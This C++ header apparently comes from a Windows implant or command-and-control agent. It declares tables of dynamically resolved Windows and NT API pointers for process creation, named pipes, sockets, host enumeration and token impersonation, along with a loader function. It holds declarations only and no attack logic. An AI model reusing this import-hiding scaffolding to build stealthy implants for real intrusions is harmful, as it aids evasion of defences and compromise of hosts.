#pragma once

#include <windows.h>
#include <iphlpapi.h>
#include <psapi.h>
#include "ntdll.h"

#define TEB NtCurrentTeb()
#define DECL_API(x) decltype(x) * x

typedef int (*printf_t)(const char* format, ...);
typedef int (*vsnprintf_t)(char* str, size_t size, const char* format, va_list args);

extern void* __cdecl memset(void*, int, size_t);
extern void* __cdecl memcpy(void*, const void*, size_t);

CHAR HdChrA(CHAR c);
WCHAR HdChrW(WCHAR c);

struct SYSMODULES 
{
	HMODULE Kernel32;
	HMODULE Ntdll;
	HMODULE Iphlpapi;
	HMODULE Advapi32;
	HMODULE Msvcrt;
	HMODULE Ws2_32;
};

struct WINAPIFUNC
{
	// kernel32
	DECL_API(CopyFileA);
	DECL_API(CreateDirectoryA);
	DECL_API(CreateFileA);
	DECL_API(CreateNamedPipeA);
	DECL_API(CreatePipe);
	DECL_API(CreateProcessA);
	DECL_API(DisconnectNamedPipe);
	DECL_API(DeleteFileA);
	DECL_API(FindClose);
	DECL_API(FindFirstFileA);
	DECL_API(FindNextFileA);
	DECL_API(FreeLibrary);
	DECL_API(GetACP);
	DECL_API(GetComputerNameExA);
	DECL_API(GetCurrentDirectoryA);
	DECL_API(GetDriveTypeA);
	DECL_API(GetExitCodeProcess);
	DECL_API(GetExitCodeThread);
	DECL_API(GetFileSize);
	DECL_API(GetFileAttributesA);
	DECL_API(GetFullPathNameA);
	DECL_API(GetLastError);
	DECL_API(GetLogicalDrives);
	DECL_API(GetOEMCP);
	DECL_API(GetModuleBaseNameA);
	DECL_API(GetModuleHandleA);
	DECL_API(GetProcAddress);
	DECL_API(GetTickCount);
	//DECL_API(GetTokenInformation);
	DECL_API(GetTimeZoneInformation);
	DECL_API(HeapAlloc);
	DECL_API(HeapCreate);
	DECL_API(HeapDestroy);
	DECL_API(HeapReAlloc);
	DECL_API(HeapFree);
	DECL_API(IsWow64Process);
	DECL_API(LoadLibraryA);
	DECL_API(LocalAlloc);
	DECL_API(LocalFree);
	DECL_API(LocalReAlloc);
	DECL_API(MoveFileA);
	DECL_API(MultiByteToWideChar);
	DECL_API(PeekNamedPipe);
	DECL_API(ReadFile);
	DECL_API(RemoveDirectoryA);
	DECL_API(RtlCaptureContext);
	DECL_API(SetCurrentDirectoryA);
	DECL_API(SetNamedPipeHandleState);
	DECL_API(Sleep);
	DECL_API(VirtualAlloc);
	DECL_API(VirtualFree);
	DECL_API(WaitNamedPipeA);
	DECL_API(WideCharToMultiByte);
	DECL_API(WriteFile);
	
	// iphlpapi
	DECL_API(GetAdaptersInfo);

	// advapi32
	DECL_API(GetTokenInformation);
	DECL_API(GetUserNameA);
	DECL_API(LookupAccountSidA);
	DECL_API(RevertToSelf);
	DECL_API(ImpersonateLoggedOnUser);
	DECL_API(SetThreadToken);

	// msvcrt
#if defined(DEBUG)
	printf_t printf;
#endif
	vsnprintf_t vsnprintf;

	//ws2_32
	DECL_API(WSAStartup);
	DECL_API(WSACleanup);
	DECL_API(socket);
	DECL_API(gethostbyname);
	DECL_API(ioctlsocket);
	DECL_API(connect);
	DECL_API(WSAGetLastError);
	DECL_API(closesocket);
	DECL_API(select);
	DECL_API(__WSAFDIsSet);
	DECL_API(shutdown);
	DECL_API(recv);
	DECL_API(recvfrom);
	DECL_API(send);
	DECL_API(sendto);
	DECL_API(accept);
	DECL_API(listen);
	DECL_API(bind);

};

struct NTAPIFUNC
{
	DECL_API(NtClose);
	DECL_API(NtContinue);
	DECL_API(NtFreeVirtualMemory);
	DECL_API(NtQueryInformationProcess);
	DECL_API(NtQuerySystemInformation);
	DECL_API(NtOpenProcess);
	DECL_API(NtOpenProcessToken);
	DECL_API(NtOpenThreadToken);
	DECL_API(NtTerminateThread);
	DECL_API(NtTerminateProcess);
	DECL_API(RtlGetVersion);
	DECL_API(RtlExitUserThread);
	DECL_API(RtlExitUserProcess);
	DECL_API(RtlIpv4StringToAddressA);
	DECL_API(RtlRandomEx);
	DECL_API(RtlNtStatusToDosError);
};

extern SYSMODULES* SysModules;
extern WINAPIFUNC* ApiWin;
extern NTAPIFUNC*  ApiNt;

BOOL ApiLoad();
